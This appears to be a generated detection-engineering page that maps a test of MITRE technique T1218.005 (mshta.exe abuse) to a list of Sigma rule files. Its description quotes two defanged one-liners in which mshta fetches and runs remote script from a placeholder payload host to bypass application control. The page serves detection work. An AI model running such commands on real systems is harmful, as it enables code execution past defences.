
[back](../index.md)

Find sigma rule :heavy_check_mark: 

# Attack: Mshta 

Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)

# MITRE
## Tactic
  - defense-evasion


## technique
  - T1218.005


# Test : Invoke HTML Application - JScript Engine with Inline Protocol Handler
## OS
  - windows


## Description:
Executes an HTA Application with JScript Engine and Inline Protocol Handler.

## Executor
powershell

# Sigma Rule
 - win_susp_powershell_parent_process.yml (id: 754ed792-634f-40ae-b3bc-e0448d33f695)

 - posh_ps_accessing_win_api.yml (id: 03d83090-8cba-44a0-b02f-0b756a050306)

 - posh_ps_malicious_keywords.yml (id: f62176f3-8128-4faa-bf6c-83261322e5eb)

 - win_fe_csharp_compile_artefact.yml (id: e4a74e34-ecde-4aab-b2fb-9112dd01aed0)

 - win_susp_csc_folder.yml (id: dcaa3f04-70c3-427a-80b4-b870d73c94c4)

 - posh_ps_suspicious_windowstyle.yml (id: 313fbb0a-a341-4682-848d-6d6f8c4fab7c)

 - posh_ps_suspicious_networkcredential.yml (id: 1883444f-084b-419b-ac62-e0d0c5b3693f)

 - posh_ps_suspicious_gwmi.yml (id: 0332a266-b584-47b4-933d-a00b103e1b37)

 - posh_ps_suspicious_keywords.yml (id: 1f49f2ab-26bc-48b3-96cc-dcffbc93eadf)

 - posh_ps_copy_item_system32.yml (id: 63bf8794-9917-45bc-88dd-e1b5abc0ecfd)

 - posh_ps_file_and_directory_discovery.yml (id: d23f2ba5-9da0-4463-8908-8ee47f614bb9)

 - win_shell_spawn_susp_program.yml (id: 3a6586ad-127a-4d3b-a677-1e6eacdf8fde)

 - win_susp_mshta_execution.yml (id: cc7abbd0-762b-41e3-8a26-57ad50d2eea3)

 - win_apt_lazarus_activity_apr21.yml (id: 4a12fa47-c735-4032-a214-6fab5b120670)

 - win_apt_ta505_dropper.yml (id: 8a582fe2-0882-4b89-a82a-da6b2dc32937)

 - win_susp_mshta_pattern.yml (id: e32f92d1-523e-49c3-9374-bdb13b46a3ba)

 - win_wmiprvse_spawning_process.yml (id: d21374ff-f574-44a7-9998-4a8c8bf33d7d)

 - win_mshta_spawn_shell.yml (id: 03cc0c25-389f-4bf8-b48d-11878079f1ca)

 - win_shell_spawn_mshta.yml (id: 772bb24c-8df2-4be0-9157-ae4dfa794037)



[back](../index.md)
